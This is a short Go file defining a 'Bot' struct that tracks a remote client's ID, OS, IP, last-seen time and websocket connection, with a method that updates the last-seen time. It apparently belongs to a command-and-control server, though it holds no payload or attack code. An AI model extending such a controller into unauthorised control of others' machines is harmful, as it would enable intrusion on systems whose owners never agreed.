package main

import (
	"sync"
	"time"

	"github.com/coder/websocket"
)

type Bot struct {
	mu sync.RWMutex

	ID       int    `json:"id"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	LastSeen time.Time
	Active   bool
	con      *websocket.Conn
	// Command Command
}

func (b *Bot) updateLastseen() {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.LastSeen = time.Now()
}
